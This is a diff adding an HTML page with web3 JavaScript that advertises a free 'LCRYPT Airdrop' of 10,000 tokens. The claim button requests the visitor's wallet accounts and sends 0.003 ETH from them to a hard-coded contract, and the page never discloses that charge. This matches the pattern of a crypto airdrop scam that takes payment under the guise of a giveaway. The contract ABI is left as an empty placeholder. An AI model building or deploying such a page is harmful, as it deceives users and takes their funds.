@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Airdrop Website</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+            position: relative; /* Add this line to make stacking work */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        #background-video {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: -1;
+            object-fit: cover;
+        }
+
+        @media (max-width: 768px) {
+            #background-video {
+                display: none; /* Hide video on small screens */
+            }
+        }
+
+        .content {
+            text-align: center;
+            color: white;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 0.5em;
+        }
+
+        p {
+            font-size: 1.2em;
+            margin-bottom: 1em;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 1.2em;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #logo {
+            width: 100px;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <video autoplay muted loop id="background-video">
+        <source src="Block.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="content">
+        <img id="logo" src="image.png" alt="Logo">
+        <h1>Welcome to the LCRYPT Airdrop!</h1>
+        <p>1.000.000.000 TOTAL AIRDROP</p>
+        <p>Claim 10,000 LCRYPT (10$) airdrop by clicking the button below:</p>
+        <p>The airdrop will end once the entire 1 billion supply has been distributed</p>
+        <button id="claim-button">Claim Airdrop</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', async function () {
+            // Check if the user is connected to any compatible wallet
+            if (typeof window.ethereum !== 'undefined' || typeof window.BinanceChain !== 'undefined') {
+                const provider = window.ethereum || window.BinanceChain;
+
+                // Initialize web3 with the detected provider
+                const web3 = new Web3(provider);
+
+                // Initialize smart contract
+                const contractAddress = '0xd84a23865A73Ba45a593B9F476df65F3cF783A97'; // Your smart contract address
+                const contractABI = [
+                    // ... (ABI definitions)
+                ];
+                const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                // Claim button functionality
+                const claimButton = document.getElementById('claim-button');
+                claimButton.addEventListener('click', async () => {
+                    try {
+                        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                        const senderAddress = accounts[0];
+                        const gasEstimate = await contract.methods.claimAirdrop().estimateGas({ from: senderAddress, value: web3.utils.toWei('0.003', 'ether') });
+                        const claimResult = await contract.methods.claimAirdrop().send({ from: senderAddress, value: web3.utils.toWei('0.003', 'ether'), gas: gasEstimate });
+
+                        alert('Airdrop claimed successfully!');
+                    } catch (error) {
+                        console.error(error);
+                        alert('Failed to claim airdrop.');
+                    }
+                });
+            } else {
+                alert('No compatible wallet detected. Please install a supported wallet to claim the airdrop.');
+            }
+        });
+    </script>
+</body>
+</html>
